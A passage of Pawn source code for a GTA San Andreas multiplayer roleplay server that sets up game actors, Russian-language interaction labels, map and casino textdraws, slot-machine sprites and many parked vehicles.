	CreateDynamicObjectEx(3593,1646.4000000,-1804.5000000,13.2000000,0.0000000,0.0000000,323.9980000); //object(la_fuckcar2) (3)
	CreateDynamicObjectEx(12957,1648.6000000,-1808.6000000,13.4000000,0.0000000,0.0000000,43.9990000); //object(sw_pickupwreck01) (2)*/

	//ghetto
		//=== GHETTO



	ostrov = CreateDynamicCube( -2588, 1664,-2000, -1827, 2186, 2000);
 
    CreateDynamicActor(149,2177.2578,-1761.8013,13.5469,324.7579);
    CreateDynamic3DTextLabel( "Взаимодействие: {f7ae11}H",-1, 2177.2578,-1761.8013,13.5469+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID, 1, 0 );
    
	for(new i = 0; i < 9; i++)
	{
	    
		JobBot[i] = CreateDynamicActor(303,JobBotPos[i][0],JobBotPos[i][1],JobBotPos[i][2],JobBotPos[i][3]);
		JobBotText[i] = CreateDynamic3DTextLabel( "Взаимодействие: {f7ae11}H",-1, JobBotPos[i][0],JobBotPos[i][1],JobBotPos[i][2]+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID, 1, 0 );
	}
	for(new i = 0; i < sizeof(Computer); i++) CreateDynamic3DTextLabel( "{f7ae11}[Компьютер]{ffffff}\nВзаимодействие: {f7ae11}H",-1, Computer[i][0],Computer[i][1],Computer[i][2]+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID, 1, 1,1 );
	for(new i = 0; i < 7; i++)
	{

		CreateDynamicActor(171,AshBotPos[i][0],AshBotPos[i][1],AshBotPos[i][2],AshBotPos[i][3],1,100.0,(i < 3) ? (2) : (1),1);
		CreateDynamic3DTextLabel( "Взаимодействие: {f7ae11}H",-1, AshBotPos[i][0],AshBotPos[i][1],AshBotPos[i][2]+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID, 1, (i < 3) ? (2) : (1),1 );
	}
	CreateDynamicActor(171,1396.4656,-12.5576,1000.9153,89.8243,1,100.0,1,1);
	CreateDynamic3DTextLabel( "Взаимодействие: {f7ae11}H",-1, 1396.4656,-12.5576,1000.9153+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID, 1, 1,1 );
		
	WashBot = CreateDynamicActor(303,1345.8383,1569.6537,1010.8253,7.6342,1,100.0,5);
	WashText = CreateDynamic3DTextLabel( "Взаимодействие: {f7ae11}H",-1, 1345.8383,1569.6537,1010.8253+1.0,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID, 1, 5 );
	for(new i = 0; i < sizeof(GzForDrugs); i++)
	{
	    GzForDrugs1[i] = GangZoneCreate(GzForDrugs[i][0],GzForDrugs[i][1],GzForDrugs[i][2],GzForDrugs[i][3]);
	}
	armzone = GangZoneCreate(83, 1790, 407, 2111);
	
	
	CreateDynamicObject(1500, -2189.02, 1965.93, 2.91, 0.00, 0.00, -3.90);

	CreateDynamicObject(1522, -2161.70, 1987.34, 2.86, 0.00, 0.00, 0.00);
	CreateDynamicObject(1532, -2028.42, 1740.16, 2.65, 0.00, 0.00, 0.00);

	CreateDynamicObject(1532, -2042.82, 1740.09, 2.65, 0.00, 0.00, 0.00);

	CreateDynamicObject(1498, -1963.65, 1731.55, 2.50, 0.00, 0.00, 43.00);

	CreateDynamicObject(1532, -2357.28, 1923.13, 2.93, 0.00, 0.00, 0.00);
	new Float:DrawPos = 25.000000;
    Cheat = 0;
    texttimer = gettime()+60*45;
    for(new i;i<10;i++)
    {
        Cheater[i] = -1;
        if(i > 0) DrawPos+=30;
   ///    CheatText[0][i] = TextDrawCreate(DrawPos,423.000000,"_");
        CheatText[i] = TextDrawCreate(DrawPos,434.000000,"-1");
        TextDrawColor(CheatText[i], 0xffffffFF);
        TextDrawFont(CheatText[i], 1);
        TextDrawSetOutline(CheatText[i], 1);
        //TextDrawLetterSize(CheatText[0][i],0.3500,1.270),
		TextDrawLetterSize(CheatText[i],0.3500,1.270);
    }
	LoadFrac();
	LoadGps();
	LoadEnters();
	LoadActor();
	LoadCam();
	LoadDiplo();
	LoadVeh();
	LoadFam();
	LoadTorg();
	LoadBizz();
	LoadProds();
	
    ShowMap[0] = TextDrawCreate(170.0, 90.0, "samaps:map");
	TextDrawLetterSize(ShowMap[0], 0.000000, 0.000000);
	TextDrawTextSize(ShowMap[0], 300.0, 300.0);
	TextDrawAlignment(ShowMap[0], 1);
	TextDrawColor(ShowMap[0], -1);
	TextDrawSetShadow(ShowMap[0], 0);
	TextDrawSetOutline(ShowMap[0], 0);
	TextDrawFont(ShowMap[0], 4);

	KrugL = TextDrawCreate(289.333557, 379.804412, "LD_BEAT:cring");
	TextDrawLetterSize(KrugL, 0.000000, 0.000000);
	TextDrawTextSize(KrugL, 48.000057, 44.800033);
	TextDrawAlignment(KrugL, 1);
	TextDrawColor(KrugL, -1);
	TextDrawSetShadow(KrugL, 0);
	TextDrawSetOutline(KrugL, 0);
	TextDrawFont(KrugL, 4);

	ShowMap[1] = TextDrawCreate(21.777761, 177.706726, "hud:radar_truck");
	TextDrawLetterSize(ShowMap[1], 0.000000, 0.000000);
	TextDrawTextSize(ShowMap[1], 14.666669, 12.942218);
	TextDrawAlignment(ShowMap[1], 1);
	TextDrawColor(ShowMap[1], -1);
	TextDrawSetShadow(ShowMap[1], 0);
	TextDrawSetOutline(ShowMap[1], 0);
	TextDrawFont(ShowMap[1], 4);
	TextDrawSetPreviewModel(ShowMap[1], 19242);
	TextDrawSetPreviewRot(ShowMap[1], 0.000000, 0.000000, 0.000000, 1.000000);

	ShowMap[2] = TextDrawCreate(40.444435, 178.204498, "- TRAIN WITH MATERIALS");
	TextDrawLetterSize(ShowMap[2], 0.163777, 1.072355);
	TextDrawAlignment(ShowMap[2], 1);
	TextDrawColor(ShowMap[2], -1);
	TextDrawSetShadow(ShowMap[2], 0);
	TextDrawSetOutline(ShowMap[2], 1);
	TextDrawBackgroundColor(ShowMap[2], 51);
	TextDrawFont(ShowMap[2], 2);
	TextDrawSetProportional(ShowMap[2], 1);

	ShowMap[3] = TextDrawCreate(20.999982, 193.639984, "hud:radar_waypoint");
	TextDrawLetterSize(ShowMap[3], 0.000000, 0.000000);
	TextDrawTextSize(ShowMap[3], 14.666669, 12.942218);
	TextDrawAlignment(ShowMap[3], 1);
	TextDrawColor(ShowMap[3], -1);
	TextDrawSetShadow(ShowMap[3], 0);
	TextDrawSetOutline(ShowMap[3], 0);
	TextDrawFont(ShowMap[3], 4);
	TextDrawSetPreviewModel(ShowMap[3], 19242);
	TextDrawSetPreviewRot(ShowMap[3], 0.000000, 0.000000, 0.000000, 1.000000);

	ShowMap[4] = TextDrawCreate(40.111106, 194.635604, "- CRACK HOUSE");
	TextDrawLetterSize(ShowMap[4], 0.163777, 1.072355);
	TextDrawAlignment(ShowMap[4], 1);
	TextDrawColor(ShowMap[4], -1);
	TextDrawSetShadow(ShowMap[4], 0);
	TextDrawSetOutline(ShowMap[4], 1);
	TextDrawBackgroundColor(ShowMap[4], 51);
	TextDrawFont(ShowMap[4], 2);
	TextDrawSetProportional(ShowMap[4], 1);

	ShowMap[5] = TextDrawCreate(48.555534, 159.791122, "press ~r~H~w~ to close");
	TextDrawLetterSize(ShowMap[5], 0.163777, 1.072355);
	TextDrawAlignment(ShowMap[5], 1);
	TextDrawColor(ShowMap[5], -1);
	TextDrawSetShadow(ShowMap[5], 0);
	TextDrawSetOutline(ShowMap[5], 1);
	TextDrawBackgroundColor(ShowMap[5], 51);
	TextDrawFont(ShowMap[5], 2);
	TextDrawSetProportional(ShowMap[5], 1);

	ShowMap[6] = TextDrawCreate(367.666656, 91.097717/*372.4501, 94.77943*/, "hud:radar_waypoint");
	TextDrawLetterSize(ShowMap[6], 0.000000, 0.000000);
	TextDrawTextSize(ShowMap[6], 8.888893, 8.462214);
	TextDrawAlignment(ShowMap[6], 1);
	TextDrawColor(ShowMap[6], -1);
	TextDrawSetShadow(ShowMap[6], 0);
	TextDrawSetOutline(ShowMap[6], 0);
	TextDrawFont(ShowMap[6], 4);
	TextDrawSetPreviewModel(ShowMap[6], 19242);
	TextDrawSetPreviewRot(ShowMap[6], 0.000000, 0.000000, 0.000000, 1.000000);

	ShowMap[7] = TextDrawCreate(344.222351, 172.239974 /*350.89097 ,175.148225*/, "hud:radar_truck");
	TextDrawLetterSize(ShowMap[7], 0.000000, 0.000000);
	TextDrawTextSize(ShowMap[7], 8.888893, 8.462214);
	TextDrawAlignment(ShowMap[7], 1);
	TextDrawColor(ShowMap[7], -1);
	TextDrawSetShadow(ShowMap[7], 0);
	TextDrawSetOutline(ShowMap[7], 0);
	TextDrawFont(ShowMap[7], 4);
	TextDrawSetPreviewModel(ShowMap[7], 19242);
	TextDrawSetPreviewRot(ShowMap[7], 0.000000, 0.000000, 0.000000, 1.000000);
	
	RolikiSp = CreateDynamicCube(1426, -1724.5,-1000.0, 1535, -1587.5, 2000.0);
	spprog = CreateDynamicCube(93.0, 1320.0,-1000.0, 312.0, 1503.0, 2000.0);
	//zavod



	picpost[0] = CreateDynamicPickup(1247,23,917.8914,727.3227,10.8564,0);
	picpost[1] = CreateDynamicPickup(1247,23,-599.7252,638.9518,16.8232,0);
	picpost[2] = CreateDynamicPickup(1247,23,-735.0247,2060.6694,60.3828,0);
	picpost[3] = CreateDynamicPickup(1247,23,1738.9719,522.8969,28.0757,0);
	picpost[4] = CreateDynamicPickup(1247,23,51.6406,-1531.3132,5.6154,0);
    sppost[0] = CreateDynamicSphere(917.8914,727.3227,10.8564, 10.0);
    sppost[1] = CreateDynamicSphere(-599.7252,638.9518,16.8232, 10.0);
    sppost[2] = CreateDynamicSphere(-735.0247,2060.6694,60.3828, 10.0);
    sppost[3] = CreateDynamicSphere(1738.9719,522.8969,28.0757, 20.0);
    sppost[4] = CreateDynamicSphere(51.6406,-1531.3132,5.6154, 20.0);
	//posti
	for(new i = 0 ; i <= 5; i++)
	{
	    shlagsp[i] = CreateDynamicSphere(postshlag[i][6], postshlag[i][7], postshlag[i][8], 1.0);
		shlagpos[i] = CreateDynamicObject(968, postshlag[i][0], postshlag[i][1], postshlag[i][2],  postshlag[i][3], postshlag[i][4], postshlag[i][5],-1,-1,-1,300.000,300.000);
		shlagspveh[i] = CreateDynamicSphere(postshlag[i][0], postshlag[i][1], postshlag[i][2], 10.0);
	}
	BattleSp = CreateDynamicSphere(1067.2545,1758.1206,10.8203, 15.0);
//	DestroyDynamicObject(shlagpos[2]);
	//DestroyDynamicObject(shlagpos[3]);

	//==
	Create3DTextLabelEx( "Используйте: {f7ae11}ПКМ + F", -1,769.7948,13.6370,1000.6994,10.0, -1, 1 );
	Create3DTextLabelEx( "Используйте: {f7ae11}H", -1,773.4354,-2.5054,1000.84794,10.0, -1, 1 );
	Create3DTextLabelEx( "Используйте: {f7ae11}H", -1,773.7392,1.5374,1001.1402,10.0, -1, 1 );
	Create3DTextLabelEx( "Используйте: {f7ae11}H", -1,772.9105,5.2487,1000.7802,10.0, -1, 1 );
	Create3DTextLabelEx( "Используйте: {f7ae11}H", -1,772.2916,8.8894,1000.7068,10.0, -1, 1);

	
	Create3DTextLabelEx( "Используйте: {f7ae11}H", -1,1968.35400, 1002.82202, 993.31671,10.0, 1, 1 );
	Create3DTextLabelEx( "Используйте: {f7ae11}H", -1,1968.35400, 1032.69519, 993.31671,10.0, 1, 1 );
	UpdateBiz(1);
	CreateDynamicObject(1569, 606.21, -1459.12, 13.29, 0.00, 0.00, 90.29);
 	BIZBOT[1] = CreateDynamicActor(221,-23.7369,-57.3090,1003.5469,354.9292,1,100.0,1);
 	BotLable[1] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1, -23.7369,-57.3090,1004.5469,10.0, 1, 1 );
	
	mebelshopbot = CreateDynamicActor(221,1399.9764,-26.8121,1000.9131,270.9282,1,100.0,7,7);
 	mebelshoptext = CreateDynamic3DTextLabel( "Взаимодействие: {f7ae11}H",-1, 1399.9764,-26.8121,1001.9131,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID, 7, 7 );
//	SetActorVirtualWorld(mebelshopbot,1);
	
	CreateDynamicMapIcon(BizInfo[1][bX],BizInfo[1][bY],BizInfo[1][bZ],56, 0,-1,-1,-1,200.0);
	LoadKom();
//	new act1 =
	CreateDynamicActor(28,234.3688,-145.7600,963.6039,0.0560,1,100.0,1);
//	SetActorVirtualWorld(act1,1);
	StolInfo[3][sPrice] = 100000;
	StolInfo[2][sPrice] = 10000;
	StolInfo[1][sPrice] = 1000;
	for(new i = 0; i <= 4; i++)
	{
	    StolInfo[i][sPlayer][0] = -1;
	    StolInfo[i][sPlayer][1] = -1;
	    StolInfo[i][sPlayer][2] = -1;
	    StolInfo[i][sPlayer][3] = -1;
	}
	for(new i = 0; i <= 3; i++)
	{
	    CasinoTD[i][0] = TextDrawCreate(16.999967, 203.896255, "None_//_-~n~None_//_-~n~None_//_-~n~None_//_-"); // box bet of game
		TextDrawLetterSize(CasinoTD[i][0], 0.172666, 1.102222);
		TextDrawAlignment( CasinoTD[i][0], 1);
		TextDrawColor(CasinoTD[i][0], -1);
		TextDrawSetShadow( CasinoTD[i][0], 0);
		TextDrawSetOutline( CasinoTD[i][0], 0);
		TextDrawBackgroundColor( CasinoTD[i][0], 255);
		TextDrawFont( CasinoTD[i][0], 2);
		TextDrawSetProportional( CasinoTD[i][0], 1);
		
		CasinoTD[i][1] = TextDrawCreate(31.333330, 187.166687, "players_in_game"); // Text element
		TextDrawLetterSize(CasinoTD[i][1], 0.219999, 1.210073);
		TextDrawAlignment(CasinoTD[i][1], 1);
		TextDrawColor(CasinoTD[i][1], 255);
		TextDrawUseBox(CasinoTD[i][1], true);
		TextDrawBoxColor(CasinoTD[i][1], 0);
		TextDrawSetShadow(CasinoTD[i][1], 0);
		TextDrawSetOutline(CasinoTD[i][1], 1);
		TextDrawBackgroundColor(CasinoTD[i][1], -256);
		TextDrawFont(CasinoTD[i][1], 2);
		TextDrawSetProportional(CasinoTD[i][1], 1);
		
		CasinoTD[i][2] = TextDrawCreate( 111.333312, 161.692642, "bet: 10000000$"); // box bet of game
		TextDrawLetterSize( CasinoTD[i][2], 0.184331, 1.131258);
		TextDrawAlignment( CasinoTD[i][2], 2);
		TextDrawColor( CasinoTD[i][2], -1);
		TextDrawSetShadow( CasinoTD[i][2], 0);
		TextDrawSetOutline( CasinoTD[i][2], 0);
		TextDrawBackgroundColor( CasinoTD[i][2], 255);
		TextDrawFont( CasinoTD[i][2], 2);
		TextDrawSetProportional( CasinoTD[i][2], 1);

	
	/*	CasinoTD[i] = TextDrawCreate(489.777893, 184.177780, "NONE ~r~I~w~ DICE -~n~NONE ~r~I~w~ DICE -~n~NONE ~r~I~w~ DICE -~n~NONE ~r~I~w~ DICE -");
		TextDrawLetterSize(CasinoTD[i], 0.238888, 1.341155);
		TextDrawAlignment(CasinoTD[i], 1);
		TextDrawColor(CasinoTD[i], -1);
		TextDrawSetShadow(CasinoTD[i], 0);
		TextDrawSetOutline(CasinoTD[i], 1);
		TextDrawBackgroundColor(CasinoTD[i], 51);
		TextDrawFont(CasinoTD[i], 2);
		TextDrawSetProportional(CasinoTD[i], 1);*/
	}

	////
	new Float:Y = 350.0;
	Box = CreateBox(194.0,Y-20,3*64.0 + 3*20,84,0x00000077);

	// Cherries (x25)
	Digit1[0] = CreateSprite(214.0,Y,"LD_SLOT:cherry",64,64);
	Digit2[0] = CreateSprite(288.0,Y,"LD_SLOT:cherry",64,64);
	Digit3[0] = CreateSprite(362.0,Y,"LD_SLOT:cherry",64,64);

	// grapes (x100)
	Digit1[1] = CreateSprite(214.0,Y,"LD_SLOT:grapes",64,64);
	Digit2[1] = CreateSprite(288.0,Y,"LD_SLOT:grapes",64,64);
	Digit3[1] = CreateSprite(362.0,Y,"LD_SLOT:grapes",64,64);

	// 69's (x250)
	Digit1[2] = CreateSprite(214.0,Y,"LD_SLOT:r_69",64,64);
	Digit2[2] = CreateSprite(288.0,Y,"LD_SLOT:r_69",64,64);
	Digit3[2] = CreateSprite(362.0,Y,"LD_SLOT:r_69",64,64);

	// bells (x500)
	Digit1[3] = CreateSprite(214.0,Y,"LD_SLOT:bell",64,64);
	Digit2[3] = CreateSprite(288.0,Y,"LD_SLOT:bell",64,64);
	Digit3[3] = CreateSprite(362.0,Y,"LD_SLOT:bell",64,64);

	// Bars [1 bar] (x1000)
	Digit1[4] = CreateSprite(214.0,Y,"LD_SLOT:bar1_o",64,64);
	Digit2[4] = CreateSprite(288.0,Y,"LD_SLOT:bar1_o",64,64);
	Digit3[4] = CreateSprite(362.0,Y,"LD_SLOT:bar1_o",64,64);

	// Bars [2 bar] (x2000)
	Digit1[5] = CreateSprite(214.0,Y,"LD_SLOT:bar2_o",64,64);
	Digit2[5] = CreateSprite(288.0,Y,"LD_SLOT:bar2_o",64,64);
	Digit3[5] = CreateSprite(362.0,Y,"LD_SLOT:bar2_o",64,64);
	for(new i = 0; i <= 11; i++) Create3DTextLabelEx( "Используйте: {f7ae11}H", -1,sa11738[i][9], sa11738[i][10], sa11738[i][11],5.0, 1, 1 );
	for(new i = 0; i <= 7; i++) Create3DTextLabelEx( "Используйте: {f7ae11}H", -1,objectzavod[i][0], objectzavod[i][1], objectzavod[i][2]+1,5.0, 15, 1 );
    NarkSklad = 3000;

	rentcar[0] = AddStaticVehicleEx(401,2102.8611,2099.504150,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(401,-26.794300,1165.8651,19.0531,358.0202,1,1,-1);
	AddStaticVehicleEx(405,-31.116300,1165.8651,19.0531,358.0202,1,1,-1);
	AddStaticVehicleEx(401,-35.438301,1165.8651,19.0531,358.0202,1,1,-1);
	AddStaticVehicleEx(405,-39.760299,1165.8651,19.0531,358.0202,1,1,-1);
	AddStaticVehicleEx(477,-44.082298,1165.8651,19.0531,358.0202,1,1,-1);
	AddStaticVehicleEx(477,-48.404296,1165.8651,19.0531,358.0202,1,1,-1);
	AddStaticVehicleEx(421,-52.726295,1165.8651,19.0531,358.0202,1,1,-1);
	AddStaticVehicleEx(401,2102.8611,2096.255859,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(405,2102.8611,2093.007568,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(405,2102.8611,2089.759277,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(421,2102.8611,2086.510986,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(421,2102.8611,2083.262695,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(445,2102.8611,2080.014404,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(445,2102.8611,2076.766113,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(477,2102.8611,2073.517822,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(477,2102.8611,2070.269531,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(492,2102.8611,2067.021240,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(492,2102.8611,2063.772949,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(561,2102.8611,2060.524658,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(561,2102.8611,2057.276367,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(560,2102.8611,2054.028076,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(560,2102.8611,2050.779785,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(562,2102.8611,2047.531494,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(562,2102.8611,2044.283203,10.4628,89.8464,1,1,-1);
	AddStaticVehicleEx(565,2102.8611,2041.034912,10.4628,89.8464,1,1,-1);
	
	AddStaticVehicleEx(401,311.4524,-1809.4862,4.1871,0.0262,1,1,-1); // 1
	AddStaticVehicleEx(401,315.1420,-1809.3141,4.2008,0.8075,1,1,-1); // 2
	AddStaticVehicleEx(405,318.5127,-1809.0448,4.2807,359.4165,1,1,-1); // 1
	AddStaticVehicleEx(405,321.8517,-1809.0758,4.2818,0.1173,1,1,-1); // 1
	AddStaticVehicleEx(421,324.9948,-1809.4106,4.2888,358.8176,1,1,-1); // 1
	AddStaticVehicleEx(421,328.2672,-1809.5385,4.2878,0.4027,1,1,-1); // 1
	AddStaticVehicleEx(445,331.4034,-1809.3715,4.2868,0.3168,1,1,-1); // 1
	AddStaticVehicleEx(445,334.5937,-1809.4022,4.2932,0.2096,1,1,-1); // 1
	AddStaticVehicleEx(477,337.7929,-1809.2292,4.2020,0.0680,1,1,-1); // 1
	AddStaticVehicleEx(477,341.2270,-1809.1575,4.2171,0.4053,1,1,-1); // 1
	AddStaticVehicleEx(492,344.4925,-1809.2190,4.2315,359.3021,1,1,-1); // 1
	AddStaticVehicleEx(492,350.9447,-1809.5399,4.2648,0.2061,1,1,-1); // 1
	AddStaticVehicleEx(561,354.0487,-1809.5951,4.2664,359.2200,1,1,-1); // 1
	AddStaticVehicleEx(561,357.4551,-1809.4315,4.1726,358.6642,1,1,-1); // 1
	AddStaticVehicleEx(560,340.9943,-1788.3363,4.6334,178.5235,1,1,-1); // 1
	AddStaticVehicleEx(560,336.9750,-1788.9100,4.5187,182.2046,1,1,-1); // 1
	AddStaticVehicleEx(562,333.9264,-1789.0428,4.4970,179.5753,1,1,-1); // 1
	AddStaticVehicleEx(562,330.5192,-1789.1255,4.4515,179.2867,1,1,-1); // 1
	AddStaticVehicleEx(565,327.2183,-1789.4954,4.4028,178.3664,1,1,-1); // 1
	AddStaticVehicleEx(565,324.0494,-1789.2197,4.6005,180.4117,1,1,-1); // 1
	AddStaticVehicleEx(579,320.6915,-1789.2839,4.5421,180.3508,1,1,-1); // 1
	AddStaticVehicleEx(579,316.7908,-1788.9841,4.2767,180.4334,1,1,-1); // 1
	AddStaticVehicleEx(589,313.0558,-1789.2716,4.2154,180.2264,1,1,-1); // 1
	
	
	rentcar[1] = AddStaticVehicleEx(565,2102.8611,2037.786621,10.4628,89.8464,1,1,-1);
	
	muscar[0] = AddStaticVehicleEx(408,109.377998,-227.0197,2.0020,179.7634,1,1,-1);
	AddStaticVehicleEx(408,114.298400,-227.0197,2.0020,179.7634,1,1,-1);
	AddStaticVehicleEx(408,119.218803,-227.0197,2.0020,179.7634,1,1,-1);
	AddStaticVehicleEx(408,124.139205,-227.0197,2.0020,179.7634,1,1,-1);
	AddStaticVehicleEx(408,129.059600,-227.0197,2.0020,179.7634,1,1,-1);
	AddStaticVehicleEx(408,133.980010,-227.0197,2.0020,179.7634,1,1,-1);
	AddStaticVehicleEx(408,138.900421,-227.0197,2.0020,179.7634,1,1,-1);
	AddStaticVehicleEx(408,143.820816,-227.0197,2.0020,179.7634,1,1,-1);
	AddStaticVehicleEx(408,148.741210,-227.0197,2.0020,179.7634,1,1,-1);
	muscar[1] = AddStaticVehicleEx(408,153.661621,-227.0197,2.0020,179.7634,1,1,-1);
	washcar[0] = AddStaticVehicleEx(574,19.4516,-273.448913,2.1959,271.7385,1,1,-1);
	AddStaticVehicleEx(574,19.4516,-270.770599,2.1959,271.7385,1,1,-1);
	AddStaticVehicleEx(574,19.4516,-268.092285,2.1959,271.7385,1,1,-1);
	AddStaticVehicleEx(574,19.4516,-265.413970,2.1959,271.7385,1,1,-1);
	AddStaticVehicleEx(574,19.4516,-262.735656,2.1959,271.7385,1,1,-1);
	AddStaticVehicleEx(574,19.4516,-260.057342,2.1959,271.7385,1,1,-1);
	AddStaticVehicleEx(574,19.4516,-257.379028,2.1959,271.7385,1,1,-1);
	AddStaticVehicleEx(574,19.4516,-254.700714,2.1959,271.7385,1,1,-1);
	AddStaticVehicleEx(574,19.4516,-252.022399,2.1959,271.7385,1,1,-1);
	washcar[1] = AddStaticVehicleEx(574,19.4516,-249.344085,2.1959,271.7385,1,1,-1);
	
	AddStaticVehicle(481,1210.668823,-1725.2834,13.0212,355.6337,3,3);
	AddStaticVehicle(481,1212.311035,-1725.2834,13.0212,355.6337,3,3);
	AddStaticVehicle(481,1213.953247,-1725.2834,13.0212,355.6337,3,3);
	AddStaticVehicle(481,1215.595458,-1725.2834,13.0212,355.6337,3,3);
	AddStaticVehicle(481,1217.237670,-1725.2834,13.0212,355.6337,3,3);
	AddStaticVehicle(481,1218.879882,-1725.2834,13.0212,355.6337,3,3);
	AddStaticVehicle(481,1220.522094,-1725.2834,13.0212,355.6337,3,3);
	AddStaticVehicle(481,1222.164306,-1725.2834,13.0212,355.6337,3,3);
	AddStaticVehicle(481,1223.806518,-1725.2834,13.0212,355.6337,3,3);
	AddStaticVehicle(481,1225.448730,-1725.2834,13.0212,355.6337,3,3);
	AddStaticVehicle(481,1227.090942,-1725.2834,13.0212,355.6337,3,3);
	AddStaticVehicle(481,1228.733154,-1725.2834,13.0212,355.6337,3,3);
	AddStaticVehicle(481,1230.375366,-1725.2834,13.0212,355.6337,3,3);
	AddStaticVehicle(481,1232.017578,-1725.2834,13.0212,355.6337,3,3);
	AddStaticVehicle(481,1233.659790,-1725.2834,13.0212,355.6337,3,3);

	AddStaticVehicle(481,1187.3950,-1343.008300,13.0198,270.0,3,3);
	AddStaticVehicle(481,1187.3950,-1344.539916,13.0198,270.0,3,3);
	AddStaticVehicle(481,1187.3950,-1346.071533,13.0198,270.0,3,3);
	AddStaticVehicle(481,1187.3950,-1347.603149,13.0198,270.0,3,3);
	AddStaticVehicle(481,1187.3950,-1349.134765,13.0198,270.0,3,3);
	AddStaticVehicle(481,1187.3950,-1350.666381,13.0198,270.0,3,3);
	AddStaticVehicle(481,1187.3950,-1352.197998,13.0198,270.0,3,3);
	AddStaticVehicle(481,1187.3950,-1353.729614,13.0198,270.0,3,3);
	AddStaticVehicle(481,1187.3950,-1355.261230,13.0198,270.0,3,3);
	AddStaticVehicle(481,1187.3950,-1356.792846,13.0198,270.0,3,3);
	AddStaticVehicle(481,1187.3950,-1358.324462,13.0198,270.0,3,3);
	AddStaticVehicle(481,1187.3950,-1359.856079,13.0198,270.0,3,3);
	AddStaticVehicle(481,1187.3950,-1361.387695,13.0198,270.0,3,3);
	AddStaticVehicle(481,1187.3950,-1362.919311,13.0198,270.0,3,3);
	AddStaticVehicle(481,1187.3950,-1364.450927,13.0198,270.0,3,3);
	
	AddStaticVehicleEx(481,1799.9679,-1933.6174,12.8421,359.3417,3,3,15); //
	AddStaticVehicleEx(481,1798.5814,-1933.5168,12.8421,0.1193,3,3,15); //
	AddStaticVehicleEx(481,1797.1599,-1933.3297,12.8398,359.0509,3,3,15); //
	AddStaticVehicleEx(481,1795.6252,-1933.4664,12.8439,1.7549,3,3,15); //
	AddStaticVehicleEx(481,1794.1458,-1933.4337,12.8416,355.2508,3,3,15); //
	AddStaticVehicleEx(481,1792.6783,-1933.4976,12.8421,0.2650,3,3,15); //
	AddStaticVehicleEx(481,1801.5065,-1933.5411,12.8450,358.8120,3,3,15); //
	AddStaticVehicleEx(481,1802.8788,-1933.5236,12.8434,357.5502,3,3,15); //
	AddStaticVehicleEx(481,1804.6692,-1933.3378,12.8439,0.5305,3,3,15); //
	AddStaticVehicleEx(481,1791.2395,-1933.2798,12.8467,358.9609,3,3,15); //
	AddStaticVehicleEx(481,1789.7839,-1933.4006,12.8434,2.6361,3,3,15); //
	AddStaticVehicleEx(481,1788.1621,-1933.7159,12.8423,358.5646,3,3,15); //
	AddStaticVehicleEx(481,1786.1045,-1933.7145,12.8430,4.0286,3,3,15); //
	
	AddStaticVehicleEx(481,1437.4475,-2280.5269,13.0030,75.8309,3,3,15); //
	AddStaticVehicleEx(481,1437.2823,-2279.0527,13.0035,71.2763,3,3,15); //
	AddStaticVehicleEx(481,1437.3459,-2277.6631,13.0038,69.3671,3,3,15); //
	AddStaticVehicleEx(481,1437.2822,-2276.0093,13.0036,72.2175,3,3,15); //
	AddStaticVehicleEx(481,1437.3226,-2274.4412,13.0035,71.0030,3,3,15); //
	AddStaticVehicleEx(481,1437.4469,-2272.8203,13.0042,71.0436,3,3,15); //
	AddStaticVehicleEx(481,1437.7867,-2271.3542,13.0043,71.3804,3,3,15); //
	AddStaticVehicleEx(481,1438.1125,-2269.7197,13.0040,68.9042,3,3,15); //
	AddStaticVehicleEx(481,1438.3597,-2268.1340,13.0047,75.2590,3,3,15); //
	AddStaticVehicleEx(481,1439.1239,-2266.4026,13.0020,65.7183,3,3,15); //
	AddStaticVehicleEx(481,1439.9237,-2264.6111,13.0034,63.3128,3,3,15); //
	AddStaticVehicleEx(481,1437.1144,-2296.4751,13.0039,97.6490,3,3,15); //
	AddStaticVehicleEx(481,1437.3030,-2298.5745,13.0029,97.0545,3,3,15); //
	AddStaticVehicleEx(481,1437.5651,-2300.8628,13.0035,99.6489,3,3,15); //
	AddStaticVehicleEx(481,1438.0126,-2302.6868,13.0040,105.8955,3,3,15); //
	AddStaticVehicleEx(481,1438.2097,-2304.4202,13.0057,104.2267,3,3,15); //
	AddStaticVehicleEx(481,1438.5764,-2306.0212,13.0053,108.1442,3,3,15); //
	AddStaticVehicleEx(481,1439.1498,-2307.5422,13.0042,111.9872,3,3,15); //
	AddStaticVehicleEx(481,1439.6971,-2309.1511,13.0044,117.7219,3,3,15); //


	AddStaticVehicleEx(481,1580.2460,697.725524,10.2229,267.1944,-1,-1,60);
	AddStaticVehicleEx(481,1580.2460,696.472839,10.2229,267.1944,-1,-1,60);
	AddStaticVehicleEx(481,1580.2460,695.220153,10.2229,267.1944,-1,-1,60);
	AddStaticVehicleEx(481,1580.2460,693.967468,10.2229,267.1944,-1,-1,60);
	AddStaticVehicleEx(481,1580.2460,692.714782,10.2229,267.1944,-1,-1,60);
	AddStaticVehicleEx(481,1580.2460,691.462097,10.2229,267.1944,-1,-1,60);
	AddStaticVehicleEx(481,1580.2460,690.209411,10.2229,267.1944,-1,-1,60);
